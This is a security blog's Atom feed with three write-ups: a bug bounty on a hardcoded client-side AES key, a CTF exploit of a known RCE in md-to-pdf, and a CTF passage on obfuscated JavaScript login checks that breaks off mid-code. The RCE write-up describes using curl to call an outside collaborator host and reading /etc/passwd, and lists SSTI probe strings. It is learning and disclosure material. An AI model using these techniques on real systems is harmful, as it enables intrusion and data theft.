<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://qlkwej.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://qlkwej.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2023-07-23T23:34:18+07:00</updated><id>https://qlkwej.github.io/feed.xml</id><title type="html">blank</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">Bug Bounty - Bypass client-side encryption</title><link href="https://qlkwej.github.io/blog/2022/client-side-encryption-failed/" rel="alternate" type="text/html" title="Bug Bounty - Bypass client-side encryption"/><published>2022-07-15T11:09:00+07:00</published><updated>2022-07-15T11:09:00+07:00</updated><id>https://qlkwej.github.io/blog/2022/client-side-encryption-failed</id><content type="html" xml:base="https://qlkwej.github.io/blog/2022/client-side-encryption-failed/"><![CDATA[<details><summary>Disclaimer</summary> <p>I am not an active bug bounty hunter, I do bug bounty for fun and validating my theory after office hours. Feedback / comments / PRs are welcome :)</p> </details> <h2 id="tldr">TL;DR</h2> <p>This writeup is about bypassing client-side encryption. The approach is similar to my previous CTF write-up <a href="https://qlkwej.github.io/write-ups/2022/06/06/the-try-zone.html">The Try Zone</a>.</p> <p>I will call the company <code class="language-plaintext highlighter-rouge">evilcorp</code> and the application <code class="language-plaintext highlighter-rouge">evilapp</code> for the sake of privacy.</p> <hr/> <h2 id="problem">Problem</h2> <p>During testing on <code class="language-plaintext highlighter-rouge">evilapp</code> I notice a unique business flow. When I login to the application by inserting my phone number (<code class="language-plaintext highlighter-rouge">STEP 1</code>), it return an encrypted HTTP response. But when I input the password, my email address is auto-filled in the HTTP request analyzed in BurpSuite but itâ€™s not visibile in front-end. It means the response is decrypted before it used in the <code class="language-plaintext highlighter-rouge">STEP 2</code></p> <p>Another weird thing is, my phone number isnâ€™t validated yet but why the email address is returned ? ðŸ¤” I did deeper and analyzing the encryption flow. I found that the encryption is using AES-128-CBC with a static key and IV. The key and IV is stored in the javascript file.</p> <hr/> <h2 id="attack-vectors">Attack vectors</h2> <p>To exploit this issue, I create a simple nodejs script to decrypt the HTTP response. The script is using the same encryption algorithm and key/IV as the application. I redacted several info in the script for the sake of privacy.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bb/bb-1.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Submit it to the bugbounty provider, and they triage it.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bb/bb-2.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <hr/> <h2 id="solution">Solution</h2> <p>I suggest several recommendation to fix the issue to <code class="language-plaintext highlighter-rouge">evilcorp</code>, such as:</p> <ol> <li>Implementing captcha (i.e., google captcha) to prevent automated script enumeration</li> <li>Donâ€™t return sensitive information, such as email address, passwordExpired info. The encryption is useless since the key, and iv are hardcoded in client side.</li> <li>Change the login flow, by using phone number and password directly or email address and password directly. Donâ€™t mix it.</li> <li>Or, add validation after user inserting their phone-number. Such as: unqiue code sent to userâ€™s phone number, or email address. To confirm if the phone number is belongs to the current user.</li> </ol> <hr/>]]></content><author><name>Dwiki Kusuma</name></author><category term="write-ups"/><category term="bb"/><summary type="html"><![CDATA[Writeup for one of private bug bounty related to client-side encryption bypass]]></summary></entry><entry><title type="html">Web - BlinkerFluids Writeup</title><link href="https://qlkwej.github.io/blog/2022/web-blinkerfluids/" rel="alternate" type="text/html" title="Web - BlinkerFluids Writeup"/><published>2022-05-16T11:09:00+07:00</published><updated>2022-05-16T11:09:00+07:00</updated><id>https://qlkwej.github.io/blog/2022/web-blinkerfluids</id><content type="html" xml:base="https://qlkwej.github.io/blog/2022/web-blinkerfluids/"><![CDATA[<details><summary>Disclaimer</summary> <p>I am not a CTF addict nor maniac, I do CTF for fun and learning purpose. So, if you are looking for a writeup that is very detailed and easy to understand, I suggest you to find another writeup.</p> <p>This writeup is just a note for myself and maybe for someone who is looking for a hint to solve the challenge. Feedback / comments / PRs are welcome :)</p> </details> <h2 id="tldr">TL;DR</h2> <p>This writeup is about BlinkerFluids challenge from Cyber Apocalypse CTF 2022 - Intergalactic Chase. To get the flag we need to exploit the RCE vulnerability on the markdown parser engine.</p> <h2 id="challenge-description">Challenge Description</h2> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/blinker-1.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Upon checking the challenge description, we are given a short description about the challenge.</p> <blockquote> <p>Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klausâ€™ home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids corp. Ulysses has infiltrated this supplier organization one of the HR departement tools and needs your help to get into their server. Can you help him?</p> </blockquote> <p>Let start the challenge by visiting the given link.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/blinker-2.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Itâ€™s an invoice web application, letâ€™s take a look.</p> <hr/> <h2 id="problem">Problem</h2> <p>This challenges provide us with a source code, so we can check the source code to find the vulnerability.</p> <pre><code class="language-javscript">&lt;!-- the file on main.js --&gt;


    $(document).ready(function() {
        listInvoice();
        $('#create-btn').on('click', showForm);
        $('#save-btn').on('click', addInvoice);
        window.easyMDE = new EasyMDE({element: $('#markdown_content')[0], renderingConfig: {singleLineBreaks: false}});
    });

    const showForm = () =&gt; {
        $('#invoices_view').hide();
        $('#markdown_view').slideDown();
    }

    const populateTable = (data) =&gt; {
        tRow = `&lt;tr&gt;
                    &lt;td&gt;${data.invoice_id}&lt;/td&gt;
                    &lt;td&gt;${data.created}&lt;/td&gt;
                    &lt;td&gt;&lt;a href="/static/invoices/${data.invoice_id}.pdf" target="_blank"&gt;PDF&lt;/a&gt;&lt;/td&gt;
                    &lt;td&gt;&lt;a href="#" onclick="removeInvoice('${data.invoice_id}')"&gt;Delete&lt;/a&gt;&lt;/td&gt;
                &lt;/tr&gt;`;
        $('#invoice-list').append(tRow);
    }

    const listInvoice = async () =&gt; {
        await fetch('/api/invoice/list', {
            method: 'GET'
        })
        .then((response) =&gt; response.json()
            .then((data) =&gt; {
                if (response.status == 200) {
                    for (let row of data) {
                        populateTable(row);
                    }
                    return;
                }
            }))
        .catch((error) =&gt; {
            console.log(error);
        });
    };

    const removeInvoice = async (invoice_id) =&gt; {
        await fetch('/api/invoice/delete', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({invoice_id}),
        })
        .then((response) =&gt; {
            location.reload();
        })
        .catch((error) =&gt; {
            console.log(error);
        });
    }

    const addInvoice = async () =&gt; {

        $('#save-btn').prop('disabled', true);

        let card = $('#resp-msg');
        card.hide();

        let loading = $('#loading_view');
        loading.show();
        $('.pdf_frame').hide();

        let markdown_content = window.easyMDE.value();

        if ($.trim(markdown_content) === '') {
            $('#save-btn').prop('disabled', false);
            card.text('Please add some content first!');
            card.attr('class', 'alert alert-danger');
            card.show();
            loading.hide();
            return;
        }

        await fetch('/api/invoice/add', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({markdown_content}),
            })
            .then((response) =&gt; response.json()
                .then((data) =&gt; {
                    if (response.status == 200) {
                        window.setTimeout(function() {
                            loading.hide();
                            location.reload();
                            }, 2500);
                            return;
                    } else {
                        loading.hide();
                        card.text(data.message);
                        card.attr('class', 'alert alert-danger');
                        card.show();
                    }
                }))
            .catch((error) =&gt; {
                loading.hide();
                card.text(error);
                card.attr('class', 'alert alert-danger');
                card.show();
            });
    }
</code></pre> <p>What I found from the source code:</p> <ol> <li>Path of the invoice is <code class="language-plaintext highlighter-rouge">/static/invoices/${data.invoice_id}.pdf</code></li> <li>API to delete the invoice <code class="language-plaintext highlighter-rouge">await fetch('/api/invoice/delete', {...}</code></li> <li>API to add the invoice <code class="language-plaintext highlighter-rouge">await fetch('/api/invoice/add', {...}</code></li> </ol> <hr/> <h2 id="attack-vectors">Attack vectors</h2> <p>Letâ€™s use the application as it is, and see what we can do with it. We can create the invoice, delete the invoice, and see the invoice.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/blinker-3.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>The potential threat of this application is the engine to render the invoice.</p> <ul> <li>How the engine works?</li> </ul> <p>Will discuss more on the obstacle later in <code class="language-plaintext highlighter-rouge">lesson-leared</code> section.</p> <p>After several attempt, finnaly I found the potential starting point to exploit the application.</p> <h3 id="checking-the-packagejson">Checking the package.json</h3> <p>In package.json we can see the details of package that used in the application, one of the package that cought my attention is <code class="language-plaintext highlighter-rouge">md-to-pdf</code>. Because itâ€™s the <code class="language-plaintext highlighter-rouge">engine</code> to compile the invoice to pdf.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/blinker-8.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Checking the version <code class="language-plaintext highlighter-rouge">md-to-pdf</code> is <code class="language-plaintext highlighter-rouge">v4.1.0</code> it has a critical security issue based on synk information.<d-footnote>https://snyk.io/advisor/npm-package/md-to-pdf</d-footnote></p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/blinker-9.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Digging depper on <code class="language-plaintext highlighter-rouge">md-to-pdf</code> package, I found the package was vulnerable to a Remote Code Execution with 9.8 score which indicate the severity is critical.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/blinker-11.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>To validate the assumption, I try to create a simple payload to check if the application is vulnerable to RCE by calling the Burp collabolator server with <code class="language-plaintext highlighter-rouge">curl</code> command.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/blinker-12.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Itâ€™s confirmed that the application is vulnerable to RCE. ***</p> <h2 id="solution">Solution</h2> <p>Because Iâ€™m too lazy to use VPS to exploit this issue, I use Burp Collaborator instead, another alternative can use https://webhook.site/</p> <p>First, I try to read the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> If we can retrieve it, it means we can read any file in the server.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/blinker-13.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Then, I check the file in the current working directory (CWD) and one level above the CWD. I found the <code class="language-plaintext highlighter-rouge">flag.txt</code> file</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/blinker-14.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Read the flag.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/blinker-15.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>flag: <code class="language-plaintext highlighter-rouge">HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}</code></p> <hr/> <h2 id="lesson-learned">Lesson Learned</h2> <p>I learn several things from this challenge:</p> <h3 id="checking-the-potential-pdf-engine-by-the-server-response-blackbox">Checking the potential pdf engine by the Server response (blackbox)</h3> <p>I didnâ€™t check the source code yet, on this point I guess the engine is related to node.js application and I found this article<d-footnote>https://www.smashingmagazine.com/2019/04/nodejs-express-api-markdown-html/</d-footnote>. I thought the application is using <code class="language-plaintext highlighter-rouge">showdown</code> markdown parser. Later I found itâ€™s a rabbit hole, since itâ€™s not used in <code class="language-plaintext highlighter-rouge">package.json</code>.</p> <h3 id="potential-ssti-on-the-pdf-engine-blackbox">Potential SSTI on the pdf engine (blackbox)</h3> <p>I didnâ€™t check the source code yet, on this point I guess there is a potential SSTI issue during the renderring process. I try several SSTI payload such as <code class="language-plaintext highlighter-rouge">{ { 7*7 } } &lt;% 7*7 %&gt; #{7*7}</code> etc.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/blinker-4.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>None of them work. I thought the application is vulnerable. Later I found itâ€™s a rabbit hole, because it using <code class="language-plaintext highlighter-rouge">nunjucks</code> template language for javascript but it used in front-end not in back-end</p> <h3 id="potential-xss-on-the-pdf-engine-blackbox">Potential XSS on the pdf engine (blackbox)</h3> <p>I didnâ€™t check the source code yet, on this point I guess there is a potential XSS issue during the renderring process. I try several XSS payload using <code class="language-plaintext highlighter-rouge">&lt;iframe&gt;</code> tag.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/blinker-6.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/blinker-7.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>It works, but with no impact and not related to this challenge, so I skiped it.</p>]]></content><author><name>Dwiki Kusuma</name></author><category term="write-ups"/><category term="ctf"/><summary type="html"><![CDATA[Writeup for BlinkerFluids Challenge. Cyber Apocalypse CTF 2022 - Intergalactic Chase]]></summary></entry><entry><title type="html">Web - The Try Zone</title><link href="https://qlkwej.github.io/blog/2022/the-try-zone/" rel="alternate" type="text/html" title="Web - The Try Zone"/><published>2022-05-16T11:09:00+07:00</published><updated>2022-05-16T11:09:00+07:00</updated><id>https://qlkwej.github.io/blog/2022/the-try-zone</id><content type="html" xml:base="https://qlkwej.github.io/blog/2022/the-try-zone/"><![CDATA[<details><summary>Disclaimer</summary> <p>I am not a CTF addict nor maniac, I do CTF for fun and learning purpose. So, if you are looking for a writeup that is very detailed and easy to understand, I suggest you to find another writeup.</p> <p>This writeup is just a note for myself and maybe for someone who is looking for a hint to solve the challenge. Feedback / comments / PRs are welcome :)</p> </details> <h2 id="tldr">TL;DR</h2> <p>This writeup is about The Try Zone challenge from USCyberGames. To get the flag we need to exploit the client-side validation on the obfuscated javascript file.</p> <h2 id="challenge-description">Challenge Description</h2> <p>URL: https://uscybercombine-try_zone_challenge.chals.io/</p> <p>Author: Lauren Delwiche</p> <hr/> <h2 id="problem">Problem</h2> <p>By visiting the URL, we will see a web application with a login page. But, we donâ€™t have the credential to login. The interesting part was, no server-side HTTP request initiated from the client to the server. It means the application is using a client-side validation ðŸ¤”</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/uscybergames/cyber-1.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <hr/> <h2 id="attack-vectors">Attack vectors</h2> <p>Itâ€™s highlightly possible to exploit the client-side validation. But, before we do that, we need to understand the application first.</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x118b98</span><span class="p">,</span> <span class="nx">_0x335091</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">_0x4be5ec</span> <span class="o">=</span> <span class="nx">a0_0x427a</span>
      <span class="p">,</span> <span class="nx">_0x22668d</span> <span class="o">=</span> <span class="nf">_0x118b98</span><span class="p">();</span>
    <span class="k">while </span><span class="p">(</span><span class="o">!!</span><span class="p">[])</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">_0x284930</span> <span class="o">=</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x4be5ec</span><span class="p">(</span><span class="mh">0x168</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x1</span> <span class="o">+</span> <span class="o">-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x4be5ec</span><span class="p">(</span><span class="mh">0x16d</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x2</span> <span class="o">*</span> <span class="p">(</span><span class="o">-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x4be5ec</span><span class="p">(</span><span class="mh">0x174</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x3</span><span class="p">)</span> <span class="o">+</span> <span class="o">-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x4be5ec</span><span class="p">(</span><span class="mh">0x176</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x4</span> <span class="o">+</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x4be5ec</span><span class="p">(</span><span class="mh">0x169</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x5</span> <span class="o">+</span> <span class="o">-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x4be5ec</span><span class="p">(</span><span class="mh">0x16c</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x6</span> <span class="o">*</span> <span class="p">(</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x4be5ec</span><span class="p">(</span><span class="mh">0x16e</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x7</span><span class="p">)</span> <span class="o">+</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x4be5ec</span><span class="p">(</span><span class="mh">0x173</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x8</span> <span class="o">*</span> <span class="p">(</span><span class="o">-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x4be5ec</span><span class="p">(</span><span class="mh">0x170</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x9</span><span class="p">)</span> <span class="o">+</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x4be5ec</span><span class="p">(</span><span class="mh">0x171</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0xa</span><span class="p">;</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">_0x284930</span> <span class="o">===</span> <span class="nx">_0x335091</span><span class="p">)</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">else</span>
                <span class="nx">_0x22668d</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x22668d</span><span class="p">[</span><span class="dl">'</span><span class="s1">shift</span><span class="dl">'</span><span class="p">]());</span>
        <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">_0x3d73e0</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">_0x22668d</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x22668d</span><span class="p">[</span><span class="dl">'</span><span class="s1">shift</span><span class="dl">'</span><span class="p">]());</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}(</span><span class="nx">a0_0x202b</span><span class="p">,</span> <span class="mh">0x62c4e</span><span class="p">));</span>
<span class="kd">function</span> <span class="nf">authenticate</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">_0x3199d5</span> <span class="o">=</span> <span class="nx">a0_0x427a</span>
      <span class="p">,</span> <span class="nx">_0x316b93</span> <span class="o">=</span> <span class="nb">document</span><span class="p">[</span><span class="nf">_0x3199d5</span><span class="p">(</span><span class="mh">0x16f</span><span class="p">)](</span><span class="nf">_0x3199d5</span><span class="p">(</span><span class="mh">0x175</span><span class="p">))[</span><span class="nf">_0x3199d5</span><span class="p">(</span><span class="mh">0x167</span><span class="p">)];</span>
    <span class="nx">_0x316b93</span> <span class="o">===</span> <span class="nf">_0x3199d5</span><span class="p">(</span><span class="mh">0x16a</span><span class="p">)</span> <span class="p">?</span> <span class="nf">alert</span><span class="p">(</span><span class="nf">_0x3199d5</span><span class="p">(</span><span class="mh">0x16b</span><span class="p">))</span> <span class="p">:</span> <span class="nf">alert</span><span class="p">(</span><span class="nf">_0x3199d5</span><span class="p">(</span><span class="mh">0x172</span><span class="p">));</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nf">a0_0x427a</span><span class="p">(</span><span class="nx">_0x156085</span><span class="p">,</span> <span class="nx">_0x9e0729</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">_0x202b2d</span> <span class="o">=</span> <span class="nf">a0_0x202b</span><span class="p">();</span>
    <span class="k">return</span> <span class="nx">a0_0x427a</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">_0x427a41</span><span class="p">,</span> <span class="nx">_0x15227a</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">_0x427a41</span> <span class="o">=</span> <span class="nx">_0x427a41</span> <span class="o">-</span> <span class="mh">0x167</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">_0xd1a30</span> <span class="o">=</span> <span class="nx">_0x202b2d</span><span class="p">[</span><span class="nx">_0x427a41</span><span class="p">];</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">a0_0x427a</span><span class="p">[</span><span class="dl">'</span><span class="s1">eUCHSe</span><span class="dl">'</span><span class="p">]</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">_0x50c8f8</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">_0x316b93</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">_0x204747</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=</span><span class="dl">'</span><span class="p">;</span>
                <span class="kd">var</span> <span class="nx">_0x4c5916</span> <span class="o">=</span> <span class="dl">''</span>
                  <span class="p">,</span> <span class="nx">_0x305af8</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
                <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">_0x2ba3d9</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> <span class="nx">_0x41150e</span><span class="p">,</span> <span class="nx">_0x20834c</span><span class="p">,</span> <span class="nx">_0x1f1f98</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="nx">_0x20834c</span> <span class="o">=</span> <span class="nx">_0x316b93</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x1f1f98</span><span class="o">++</span><span class="p">);</span> <span class="o">~</span><span class="nx">_0x20834c</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">_0x41150e</span> <span class="o">=</span> <span class="nx">_0x2ba3d9</span> <span class="o">%</span> <span class="mh">0x4</span> <span class="p">?</span> <span class="nx">_0x41150e</span> <span class="o">*</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="nx">_0x20834c</span> <span class="p">:</span> <span class="nx">_0x20834c</span><span class="p">,</span>
                <span class="nx">_0x2ba3d9</span><span class="o">++</span> <span class="o">%</span> <span class="mh">0x4</span><span class="p">)</span> <span class="p">?</span> <span class="nx">_0x4c5916</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">[</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="mh">0xff</span> <span class="o">&amp;</span> <span class="nx">_0x41150e</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="o">-</span><span class="mh">0x2</span> <span class="o">*</span> <span class="nx">_0x2ba3d9</span> <span class="o">&amp;</span> <span class="mh">0x6</span><span class="p">))</span> <span class="p">:</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">_0x20834c</span> <span class="o">=</span> <span class="nx">_0x204747</span><span class="p">[</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x20834c</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">_0x26c4e4</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> <span class="nx">_0x432f0a</span> <span class="o">=</span> <span class="nx">_0x4c5916</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">_0x26c4e4</span> <span class="o">&lt;</span> <span class="nx">_0x432f0a</span><span class="p">;</span> <span class="nx">_0x26c4e4</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">_0x305af8</span> <span class="o">+=</span> <span class="dl">'</span><span class="s1">%</span><span class="dl">'</span> <span class="o">+</span> <span class="p">(</span><span class="dl">'</span><span class="s1">00</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">_0x4c5916</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x26c4e4</span><span class="p">)[</span><span class="dl">'</span><span class="s1">toString</span><span class="dl">'</span><span class="p">](</span><span class="mh">0x10</span><span class="p">))[</span><span class="dl">'</span><span class="s1">slice</span><span class="dl">'</span><span class="p">](</span><span class="o">-</span><span class="mh">0x2</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="nf">decodeURIComponent</span><span class="p">(</span><span class="nx">_0x305af8</span><span class="p">);</span>
            <span class="p">};</span>
            <span class="nx">a0_0x427a</span><span class="p">[</span><span class="dl">'</span><span class="s1">NoXrAA</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">_0x50c8f8</span><span class="p">,</span>
            <span class="nx">_0x156085</span> <span class="o">=</span> <span class="nx">arguments</span><span class="p">,</span>
            <span class="nx">a0_0x427a</span><span class="p">[</span><span class="dl">'</span><span class="s1">eUCHSe</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="o">!!</span><span class="p">[];</span>
        <span class="p">}</span>
        <span class="kd">var</span> <span class="nx">_0x415787</span> <span class="o">=</span> <span class="nx">_0x202b2d</span><span class="p">[</span><span class="mh">0x0</span><span class="p">]</span>
          <span class="p">,</span> <span class="nx">_0x211fcd</span> <span class="o">=</span> <span class="nx">_0x427a41</span> <span class="o">+</span> <span class="nx">_0x415787</span>
          <span class="p">,</span> <span class="nx">_0x5d78bf</span> <span class="o">=</span> <span class="nx">_0x156085</span><span class="p">[</span><span class="nx">_0x211fcd</span><span class="p">];</span>
        <span class="k">return</span> <span class="o">!</span><span class="nx">_0x5d78bf</span> <span class="p">?</span> <span class="p">(</span><span class="nx">_0xd1a30</span> <span class="o">=</span> <span class="nx">a0_0x427a</span><span class="p">[</span><span class="dl">'</span><span class="s1">NoXrAA</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0xd1a30</span><span class="p">),</span>
        <span class="nx">_0x156085</span><span class="p">[</span><span class="nx">_0x211fcd</span><span class="p">]</span> <span class="o">=</span> <span class="nx">_0xd1a30</span><span class="p">)</span> <span class="p">:</span> <span class="nx">_0xd1a30</span> <span class="o">=</span> <span class="nx">_0x5d78bf</span><span class="p">,</span>
        <span class="nx">_0xd1a30</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">,</span>
    <span class="nf">a0_0x427a</span><span class="p">(</span><span class="nx">_0x156085</span><span class="p">,</span> <span class="nx">_0x9e0729</span><span class="p">);</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nf">a0_0x202b</span><span class="p">()</span> <span class="p">{</span>
